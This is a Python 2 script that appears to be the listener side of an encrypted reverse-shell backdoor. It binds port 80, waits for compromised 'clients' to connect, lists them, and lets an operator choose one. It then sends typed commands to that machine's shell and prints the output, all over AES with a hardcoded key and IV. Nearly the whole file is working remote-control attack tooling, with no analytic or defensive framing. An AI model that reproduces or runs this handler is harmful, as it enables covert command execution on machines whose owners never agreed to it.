#!/usr/bin/env python2

import socket, time, os, sys, urllib, base64, subprocess as sp, threading, binascii, SimpleHTTPServer, SocketServer, Queue
from Crypto.Cipher import AES

aesobj = AES.new('brvty5b6BB7y56b754BBERBT', AES.MODE_CFB, 'odiryvt93y489yrv')
														#Cryptography stuff
EncodeAES = lambda  s: base64.b64encode(aesobj.encrypt(s))
DecodeAES = lambda  e: aesobj.decrypt(base64.b64decode(e))

marker = chr(255) # End of message marker
TIMEOUT = 30

server_sock = socket.socket()
server_sock.bind(("0.0.0.0",80))
server_sock.listen(5)

print "Listening for client."

def print_clients(clients):
	try:
		os.system('cls' if os.name == 'nt' else 'clear')
		print("Listening for clients...")
		print("*-----*")
		if not clients:
			print(" ")
		else:
			for i, sock in enumerate(clients):
				print("["+str(i+1)+"]: "+str(clients[i][0])+":"+str(clients[i][1]))
		print("*-----*")
		print("Press Ctrl-C to select client.")
	except KeyboardInterrupt:
		return
		
def get_client():
	server_sock.settimeout(1)
	clientsocks = []
	clientaddrs = []
	while True:
		print_clients(clientaddrs)
		try:
			try:
				s, a = server_sock.accept()
				clientsocks.append(s)
				clientaddrs.append(a)
			except socket.timeout:
				continue
		except KeyboardInterrupt:
			os.system('cls' if os.name == 'nt' else 'clear')
			print("*-----*")
			for i, sock in enumerate(clientaddrs):
				print("["+str(i+1)+"]: "+str(clientaddrs[i][0])+":"+str(clientaddrs[i][1]))
			print(" \n[0]: Exit")
			print("*-----*")
			selected = raw_input("[?]Input number of selected sock: ")
			if selected == "0":
				os._exit(0)
			s = clientsocks[int(selected)-1]
			a = clientaddrs[int(selected)-1][0]
			clientsocks = []
			clientaddrs = []
			return s, a

comm_socket, addr = get_client()
comm_socket.setblocking(1)
sys.stdout.write(DecodeAES(comm_socket.recv(4096))[:-1]) # Receive current directory and prompt

output_queue = Queue.Queue()

class MessageWorker: # Base class for adding a message worker
	def __init__(self, data_prefix):
		self.data_prefix = data_prefix # Prefix used to identify to which worker data should be sent
		self.input_queue = Queue.Queue() # Queue of data to process
		
	def send(self, data):
		output_queue.put(self.data_prefix+data+marker) # Place message on queue to be sent 
		
	def put(self, data):
		self.input_queue.put(data)
		
	def run(self):
		pass
		
class UserInputWorker(MessageWorker): # Worker which takes user input and sends it for execution

	def run(self):
		try:
			while True:
				user_input = raw_input()
				self.send(user_input)
				sys.stdout.write(self.input_queue.get())
		except EOFError: # Exit when user presses Control-C
			os._exit(0)
			
class FileTransferWorker(MessageWorker):

	def run(self):
		pass
			
class TransmitWorker(MessageWorker): # Pseudo-worker to send data to shell
	def run(self):
		while True:
			comm_socket.sendall(EncodeAES(output_queue.get()))	
			
workers = []
user_input_worker = UserInputWorker(chr(1))
transmit_worker = TransmitWorker(chr(0)) # Create workers
workers.append(user_input_worker)
workers.append(transmit_worker)

for worker in workers: # Start workers
	t = threading.Thread(target=worker.run)
	t.daemon = True
	t.start()

while True:
	data = ""
	while not data.endswith(marker):
		data += DecodeAES(comm_socket.recv(4096))
	if not data: break
	data = data[:-1] # Get data from shell and remove marker
	
	for worker in workers:
		if worker.data_prefix == data[0]: # Put data on correct worker's queue
			worker.put(data[1:])
			break
